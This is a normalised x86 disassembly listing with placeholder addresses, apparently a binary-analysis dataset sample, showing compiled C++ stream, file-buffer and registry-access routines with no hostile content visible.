add esp 0x1c
push esi
push ebx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001500
lea eax [ ebp - 0x48 ]
push eax
call sub_10016217
lea ecx [ ebp + 0x8c ]
push ecx
push eax
lea eax [ ebp + 0x54 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10010cbe
add esp 0x10
push esi
push ebx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001500
lea eax [ ebp + 0x54 ]
push eax
lea eax [ ebp + 0xa8 ]
push eax
call sub_1000f6d1
pop ecx
pop ecx
cmp al bl
jne r-xdata
push 0xffffffff
push esi
push ebx
lea ecx [ ebp + 0x70 ]
call sub_10001450
lea eax [ ebp - 0x28 ]
call sub_10017b5c
lea ecx [ ebp + 0x8c ]
push ecx
push eax
lea eax [ ebp + 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_10010cbe
add esp 0xc
push esi
push ebx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0xa
call sub_10001500
lea eax [ ebp + 0x38 ]
push eax
lea eax [ ebp + 0xa8 ]
push eax
call sub_1000f6d1
pop ecx
pop ecx
cmp al bl
jne r-xdata
lea eax [ ebp + 0x54 ]
push eax
mov ecx edi
call sub_1000136c
jmp r-xdata
lea eax [ ebp - 0x48 ]
call sub_10017b47
lea ecx [ ebp + 0x8c ]
push ecx
push eax
lea eax [ ebp + 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xb
call sub_10010cbe
add esp 0xc
push esi
push ebx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xd
call sub_10001500
lea eax [ ebp + 0x1c ]
push eax
lea eax [ ebp + 0xa8 ]
push eax
call sub_1000f6d1
pop ecx
pop ecx
cmp al bl
jne r-xdata
lea eax [ ebp + 0x38 ]
push eax
mov ecx edi
call sub_1000136c
jmp r-xdata
push esi
push ebx
lea ecx [ ebp + 0x54 ]
call sub_10001500
push esi
push ebx
lea ecx [ ebp + 0x8c ]
call sub_10001500
push esi
push ebx
lea ecx [ ebp + 0xa8 ]
call sub_10001500
push esi
push ebx
lea ecx [ ebp + 0x70 ]
call sub_10001500
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xc4 ]
xor ecx ebp
call sub_100242d7
add ebp 0xc8
leave
retn
push r--data
lea ecx [ ebp - 0x28 ]
call sub_1000134a
lea eax [ ebp - 0x64 ]
push eax
lea ebx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0xe
call sub_10015ec7
lea ecx [ ebp + 0x8c ]
push ecx
push eax
lea eax [ ebp ]
push eax
mov [ ebp - 0x4 ] 0xf
call sub_10010cbe
add esp 0x10
xor ebx ebx
push esi
inc ebx
push ebx
lea ecx [ ebp - 0x64 ]
call sub_10001500
push esi
push ebx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x12
call sub_10001500
lea eax [ ebp ]
push eax
lea eax [ ebp + 0xa8 ]
push eax
call sub_1000f6d1
pop ecx
pop ecx
cmp al bl
mov ecx edi
lea eax [ ebp ]
je r-xdata
lea eax [ ebp + 0x1c ]
push eax
mov ecx edi
call sub_1000136c
jmp r-xdata
push esi
push ebx
lea ecx [ ebp + 0x38 ]
call sub_10001500
push eax
call sub_1000136c
push esi
push ebx
lea ecx [ ebp ]
call sub_10001500
lea eax [ ebp + 0xa8 ]
push esi
push ebx
lea ecx [ ebp + 0x1c ]
call sub_10001500
sub_1000f9b0
push 0x108
mov eax sub_1004f643
call sub_10028236
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x114 ]
push eax
mov [ ebp + 0x8 ] ebx
call sub_1000fff4
mov eax [ ebp - 0x114 ]
mov eax [ eax + 0x4 ]
mov eax [ ebp + eax - 0x10c ]
shr eax 0x2
test al 0x1
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_10001c7f
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x2
call sub_10002075
push r--data
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x114 ]
push eax
call sub_100100dd
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0xc0 ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x4 ] bl
call sub_1000fa8d
mov eax esi
jmp r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_10001c7f
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_10002075
push r--data
lea eax [ ebp - 0x80 ]
jmp r-xdata
call sub_100282db
retn
push eax
call sub_10027dd1
sub_1000faa9
push 0x100
mov eax sub_1004f60a
call sub_10028236
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x10c ]
push eax
call sub_1000fd2b
mov eax [ ebp - 0x10c ]
mov eax [ eax + 0x4 ]
cmp [ ebp + eax - 0x104 ] ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_10001c7f
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x2
call sub_10002075
push r--data
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x20
pop ecx
call sub_1001088b
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0xbc ] ebx
jne r-xdata
lea eax [ ebp - 0x10c ]
mov [ ebp - 0x4 ] bl
call sub_1000fb74
call sub_100282db
retn
push r--data
lea ecx [ ebp - 0x30 ]
call sub_10001c7f
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_10002075
push r--data
lea eax [ ebp - 0x80 ]
jmp r-xdata
push eax
call sub_10027dd1
sub_1000fb90
push 0xc4
mov eax sub_1004dcf2
call sub_100282a2
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0xc ]
mov edi ecx
xor esi esi
push r--data
lea ecx [ ebp - 0x8c ]
mov ebx edx
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x4 ] esi
call sub_1000134a
lea eax [ ebp - 0x8c ]
push eax
push 0x20019
push ebx
push edi
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001506f
push esi
push 0x1
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x3
call sub_10001500
push [ ebp - 0x6c ]
lea eax [ ebp - 0x3c ]
push eax
call sub_10015443
cmp al 0x1
je r-xdata
push [ ebp - 0x6c ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_1001519e
push [ ebp - 0x68 ]
lea eax [ ebp - 0x64 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1001555c
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
call sub_10015514
lea ecx [ ebp - 0x3c ]
call sub_10015175
mov eax [ ebp - 0x68 ]
call sub_100282fe
retn
push r--data
lea ecx [ ebp - 0xa8 ]
call sub_10001c7f
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0xd0 ]
mov [ ebp - 0x4 ] 0x4
call sub_10002075
push r--data
lea eax [ ebp - 0xd0 ]
push eax
call sub_10027dd1
sub_1000fc8b
push 0x7c
mov eax sub_1004e2d8
call sub_100282a2
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi ecx
push r--data
lea ecx [ ebp - 0x88 ]
mov ebx edx
mov [ ebp - 0x6c ] eax
call sub_1000134a
lea eax [ ebp - 0x88 ]
push eax
push 0xf003f
push ebx
push esi
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001506f
push 0x0
push 0x1
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001500
push edi
mov edi [ ebp - 0x6c ]
lea eax [ ebp - 0x40 ]
push eax
call sub_100155dd
pop ecx
pop ecx
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x4
call sub_100153ef
lea esi [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x3
call sub_10015514
lea ecx [ ebp - 0x68 ]
call sub_10015175
mov al 0x1
jmp r-xdata
call sub_100282fe
retn
sub_1000fd2b
push 0x20
mov eax sub_1004f5d4
call sub_10028236
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_100053bb
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x20 ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000c133
pop ecx
lea ecx [ ebp - 0x18 ]
mov esi eax
call sub_10003c49
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x2c ] bl
mov cl [ ecx + 0x30 ]
push 0x2b
mov [ ebp - 0x1c ] cl
push [ ebp - 0x1c ]
add eax edi
push eax
push edx
push [ ebp - 0x2c ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ esi ]
mov ecx esi
call [ eax + 0x18 ]
cmp [ ebp - 0x2c ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
call sub_1000d05d
mov eax edi
call sub_100282db
retn 0x4
push ebx
push [ ebp - 0x14 ]
call sub_100039ed
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_1000fdbb
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_10003dcd
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_1000fe17
push 0x24
mov eax sub_1004eed1
call sub_10028236
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_100053bb
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x18 ] ebx
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10007d69
pop ecx
lea ecx [ ebp - 0x1c ]
mov esi eax
call sub_10003c49
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x30 ] bl
movzx ecx [ ecx + 0x30 ]
mov ebx [ esi ]
mov [ ebp - 0x20 ] ecx
movzx ecx [ ebp + 0xc ]
push ecx
push [ ebp - 0x20 ]
add eax edi
push eax
push edx
push [ ebp - 0x30 ]
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call [ ebx + 0x18 ]
xor ebx ebx
cmp [ ebp - 0x30 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_1000d05d
mov eax edi
call sub_100282db
retn 0x8
push ebx
push [ ebp - 0x18 ]
call sub_100039ed
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
sub_1000fead
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10003dcd
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000ff09
push 0x1c
mov eax sub_1004eea4
call sub_10028236
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_100053bb
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10007d69
pop ecx
lea ecx [ ebp - 0x18 ]
mov esi eax
call sub_10003c49
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x28 ] bl
movzx ecx [ ecx + 0x30 ]
mov ebx [ esi ]
push ecx
add eax edi
push eax
push edx
push [ ebp - 0x28 ]
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call [ ebx + 0x4 ]
xor ebx ebx
cmp [ ebp - 0x28 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_1000d05d
mov eax edi
call sub_100282db
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_100039ed
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_1000ff98
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10003dcd
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000fff4
push 0x24
mov eax sub_1004f5a7
call sub_10028236
mov esi [ ebp + 0x8 ]
xor ebx ebx
push ebx
push esi
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] ebx
call sub_1000cfea
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000c1d0
pop ecx
lea ecx [ ebp - 0x18 ]
mov edi eax
call sub_10003c49
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ eax + 0x28 ]
cmp ecx ebx
lea ebx [ ebp - 0x14 ]
push ebx
push eax
sete dl
mov [ ebp - 0x24 ] 0x1
push [ ebp - 0x24 ]
xor eax eax
push eax
mov [ ebp - 0x2c ] dl
push [ ebp - 0x2c ]
mov edx [ edi ]
push ecx
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
call [ edx + 0x1c ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
call sub_1000cb0a
mov eax esi
call sub_100282db
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_100039ed
sub_10010082
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10003dcd
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_100100dd
push 0x4
mov eax sub_1004ebcd
call sub_10028203
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ edi ] r--data
mov [ edi + 0x58 ] r--data
lea esi [ edi + 0x8 ]
push esi
mov [ ebp - 0x4 ] ebx
push edi
mov [ ebp - 0x10 ] 0x1
call sub_1000addd
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
push esi
mov [ edi + eax ] r--data
call sub_1000ae19
mov eax esi
mov [ esi ] r--data
mov [ esi + 0x48 ] bl
mov [ esi + 0x41 ] bl
call sub_1000bf46
mov eax [ rw-data ]
mov [ esi + 0x4c ] ebx
mov [ esi + 0x44 ] eax
mov [ esi + 0x3c ] ebx
push 0x21
push [ ebp + 0xc ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100109e9
test eax eax
jne r-xdata
mov eax edi
call sub_100282db
retn 0x8
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] ebx
jne r-xdata
push ebx
push eax
call sub_10003dcd
or ecx 0x4
sub_10010186
push 0x4
mov eax sub_1004ce60
call sub_10028203
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x58 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x58 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x50 ]
mov ecx esi
call sub_100101c5
mov eax [ esi - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x8 ] r--data
call sub_100282db
retn
sub_100101c5
push 0x4
mov eax sub_1004ce3a
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x48 ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000ca57
call sub_100282db
retn
mov eax esi
call sub_10010a63
sub_100101fe
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004ce0a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov esi ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
xor edi edi
cmp ecx edi
je r-xdata
xor eax eax
mov eax [ esi + 0x4c ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x34 ]
mov edx [ eax ]
add edx ecx
cmp ecx edx
jae r-xdata
cmp [ esi + 0x3c ] edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
dec [ eax ]
mov esi [ esi + 0x24 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov [ eax ] bl
push edi
push 0x8
lea ecx [ esp + 0x4c ]
mov [ esp + 0x1b ] bl
call sub_100079fe
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x48 ]
mov [ esp + 0x74 ] edi
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov edi [ esp + 0x58 ]
mov ebx eax
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
lea edx [ esp + 0x18 ]
add edi ebx
push edx
lea ebx [ esi + 0x44 ]
jmp r-xdata
push eax
movsx eax bl
push eax
call sub_10024d41
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
push edi
push eax
lea edx [ esp + 0x28 ]
push edx
lea edx [ esp + 0x24 ]
push edx
lea edx [ esp + 0x27 ]
push edx
mov [ esp + 0x2c ] eax
mov eax [ ecx ]
push ebx
call [ eax + 0x14 ]
test eax eax
jge r-xdata
jmp r-xdata
cmp eax 0x1
jg r-xdata
or esi 0xffffffff
mov eax ebx
jmp r-xdata
cmp eax 0x3
jne r-xdata
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov edi [ esp + 0x18 ]
sub edi eax
je r-xdata
movsx eax [ esp + 0x13 ]
push [ esi + 0x4c ]
push eax
call sub_10024d41
or esi 0xffffffff
pop ecx
pop ecx
cmp eax esi
je r-xdata
lea eax [ esp + 0x13 ]
mov [ esi + 0x41 ] 0x1
cmp [ esp + 0x1c ] eax
jne r-xdata
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
push [ esi + 0x4c ]
push edi
push 0x1
push eax
call sub_10024faf
add esp 0x10
cmp edi eax
jne r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x4c ]
call sub_10002020
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
test edi edi
ja r-xdata
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov edi [ esp + 0x58 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x24 ]
add edi edx
cmp [ esp + 0x58 ] 0x20
jae r-xdata
push 0x0
push 0x8
lea ecx [ esp + 0x4c ]
call sub_10007a24
sub_10010417
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
push ebx
mov ebx [ esp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
mov edx [ ecx + 0x10 ]
cmp [ edx ] eax
jae r-xdata
or eax 0xffffffff
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp [ ecx + 0x3c ] 0x0
jne r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov ecx [ ecx + 0x20 ]
dec [ ecx ]
mov eax ebx
inc eax
neg eax
sbb eax eax
and eax ebx
jmp r-xdata
movzx eax [ eax - 0x1 ]
cmp eax ebx
jne r-xdata
push eax
movzx eax bl
push eax
call sub_10025122
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
pop ebx
retn 0x4
mov eax ebx
jmp r-xdata
sub_1001047c
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x14 ]
mov edi eax
or eax 0xffffffff
cmp edi eax
je r-xdata
mov edx [ esi + 0x30 ]
mov eax [ eax ]
mov edx [ edx ]
add edx eax
cmp eax edx
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x8 ]
mov eax edi
movzx eax [ ecx ]
pop esi
retn
sub_100104b8
push 0x58
mov eax sub_1004cddd
call sub_1002826c
mov esi ecx
mov eax [ esi + 0x20 ]
mov eax [ eax ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x4c ]
cmp eax edi
jne r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x30 ]
mov eax [ eax ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae r-xdata
cmp [ esi + 0x3c ] edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
movzx eax [ eax ]
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0xf
call sub_10002004
mov [ ebp - 0x4 ] edi
jmp r-xdata
push eax
call sub_10025194
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_100282ef
retn
push [ esi + 0x4c ]
call sub_10025194
pop ecx
cmp eax 0xffffffff
jne r-xdata
movzx eax al
jmp r-xdata
push eax
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10007a24
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov edi [ ebp - 0x18 ]
mov ebx eax
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov ecx [ esi + 0x3c ]
mov edx [ ecx ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2d ]
push eax
lea eax [ ebp - 0x34 ]
push eax
add edi ebx
push edi
push [ ebp - 0x38 ]
lea eax [ esi + 0x44 ]
push eax
call [ edx + 0x10 ]
test eax eax
jl r-xdata
or esi 0xffffffff
xor edi edi
inc edi
cmp eax edi
jle r-xdata
lea eax [ ebp - 0x2d ]
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x3c ] eax
jne r-xdata
cmp eax 0x3
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x34 ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x5c ]
push eax
call sub_10010e6d
mov ecx eax
call sub_100084d4
mov ecx [ ebp - 0x34 ]
sub ecx eax
push ecx
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001cd9
cmp [ ebp - 0x18 ] edi
jb r-xdata
test edi edi
jg r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10010e6d
push edi
mov ecx eax
call sub_100084d4
push eax
lea eax [ ebp - 0x2d ]
push edi
push eax
call sub_100242f1
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x34 ]
push [ esi + 0x4c ]
dec edi
movsx eax [ edi + eax ]
push eax
call sub_10025122
pop ecx
pop ecx
movzx esi [ ebp - 0x2d ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax esi
jmp r-xdata
sub_10010654
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push edi
lea edi [ esi + 0x40 ]
xor ebx ebx
cmp [ eax ] edi
jne r-xdata
cmp [ esi + 0x4c ] ebx
je r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
call sub_10010af0
test al al
je r-xdata
cmp [ esi + 0x3c ] ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
dec [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x4c ]
call sub_10025322
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_100253a7
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ esi + 0x20 ]
cmp [ eax ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x44 ]
mov [ eax ] ebx
mov [ eax + 0x10 ] ecx
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x41 ]
mov [ ecx ] eax
mov ecx esi
sub ecx eax
mov eax [ esi + 0x30 ]
add ecx 0x41
mov [ eax ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_10010715
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
mov eax [ ebp + 0x14 ]
push ebx
push esi
mov esi ecx
mov [ esp + 0xc ] eax
mov eax [ ebp + 0x18 ]
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
mov [ esp + 0x14 ] eax
cmp [ esi + 0x4c ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
call sub_10010af0
test al al
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esi + 0x4c ]
call sub_10025415
pop ecx
pop ecx
test eax eax
